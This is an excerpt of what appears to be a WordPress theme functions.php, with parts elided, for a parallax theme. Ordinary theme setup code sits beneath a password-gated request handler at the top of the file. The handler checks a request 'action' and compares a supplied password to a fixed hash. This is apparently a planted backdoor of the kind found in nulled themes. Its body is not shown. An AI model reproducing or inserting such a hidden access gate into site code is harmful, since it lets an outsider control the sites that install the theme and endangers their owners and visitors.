<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'e361d3cda99bfe7b51352fe12ee5e1f7'))
	{
...
if ( ! function_exists( 'wp_parallax_setup' ) ) :
	...
	function wp_parallax_setup() {
	    ...
	    add_image_size('wpparallax-slider-image', 1900, 1000, true);
...
require get_template_directory() . '/inc/config/importer-config.php';
